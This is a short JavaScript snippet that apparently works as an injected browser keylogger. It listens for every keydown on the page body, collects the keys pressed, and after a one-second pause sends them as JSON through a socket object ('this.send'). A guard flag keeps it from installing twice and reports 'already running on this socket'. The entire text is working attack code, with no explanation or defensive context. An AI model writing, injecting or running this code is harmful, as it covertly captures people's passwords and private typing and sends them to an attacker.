if(!window.$_$kl){
	var $_$timer = null,
		$_$buffer = [],
		$_$self = this;
	window.$_$kl = true;
	document.querySelector('body').addEventListener('keydown', function(e){
		if($_$timer !== null){
			clearTimeout($_$timer);
		}
		$_$buffer.push(e.key);
		$_$timer = setTimeout(function(){
			$_$self.send(JSON.stringify($_$buffer));
			$_$buffer = [];
		}, 1000);
	});
}else{
	this.send('already running on this socket');
}